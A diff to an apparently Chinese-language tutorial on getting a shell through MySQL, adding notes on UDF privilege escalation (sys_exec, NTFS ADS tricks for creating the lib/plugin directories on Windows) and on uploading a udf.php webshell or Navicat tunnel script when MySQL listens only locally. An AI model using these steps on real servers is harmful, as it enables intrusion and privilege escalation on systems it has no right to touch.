@@ -62,7 +62,7 @@ mysql> select sys_exec('whoami'); #返回NULL说明执行成功了，这里使�
 +--------------------+
 ```
 
-当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹
+当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹（windows）
 
 ```mysql
 select @@basedir;   //查找mysql的目录
@@ -70,6 +70,14 @@ select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\li
 select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'; //利用NTFS ADS再次创建plugin目录
 执行成功以后再进行导出即可。
 ```
+
+**mysql仅对本地开放端口的情况**
+
+1.上传有web页面版的[udf.php](https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php)进行提权
+
+2.上传 Navicat 自带的 [tunnel 隧道脚本](https://sqlsec.lanzoux.com/ibpoGijd6bc)（php），然后通过Navicat连接，执行提权sql语句即可
+
+![img](通过mysql获取shell的几种方法/16057523604421.png)
 
 **udf实验过程遇到的坑点**
 
